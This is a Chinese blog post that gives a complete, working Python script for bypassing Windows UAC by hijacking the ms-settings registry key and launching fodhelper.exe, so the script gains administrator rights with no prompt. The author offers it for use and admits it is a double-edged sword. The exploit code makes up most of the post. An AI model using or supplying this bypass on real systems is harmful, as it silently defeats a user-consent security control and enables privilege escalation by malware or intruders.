我们在python如果获取windows管理员权限（一）中谈到了UAC的问题。

很多时候我们不希望我们的软件弹出UAC提示，这个时候我们可以通过注册表的方法去解决。这其实已经不在是一个安全的编程了，它变成了一把双刃剑。

当然我们只是讨论这种问题该怎么解决。具体用在什么方面那是你的问题咯！

通过下面的代码我们可以轻松绕过UAC

# -*- coding: utf-8 -*-
"""
Created on Mon Jan  8 09:09:51 2018

@author: coordinate
"""
from __future__ import print_function
import os
import sys
import ctypes
if sys.version_info[0] == 3:
    import winreg as winreg
else:
    import _winreg as winreg
    
CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
        
def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise
        
def execute():        
    if not is_admin():
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:                
            current_dir = __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)                
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
        #这里添加我们需要管理员权限的代码
        print('[+] The script is running with administrative privileges!')  
        
if __name__ == '__main__':
    execute()
————————————————
版权声明：本文为CSDN博主「coordinate_blog」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_17550379/article/details/79006718